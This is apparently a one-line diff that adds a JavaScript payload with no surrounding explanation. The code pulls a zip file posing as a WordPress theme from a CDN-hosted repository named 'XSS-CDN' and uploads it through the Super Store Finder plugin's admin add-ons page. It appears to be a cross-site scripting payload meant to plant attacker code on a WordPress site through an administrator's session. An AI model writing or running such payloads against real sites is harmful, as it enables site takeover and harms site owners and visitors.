@@ -1,0 +1,1 @@
+fetch('https://cdn.statically.io/gh/Xib3rR4dAr/XSS-CDN/main/ssf-super-theme-wp.zip').then(r=>r.blob()).then(b=>fetch('/wp-admin/admin.php?page=superstorefinder-wp%2Fssf-wp-admin%2Fpages%2FAdd-ons.php',{method:'POST',body:new FormData().append('fupload',b)}));
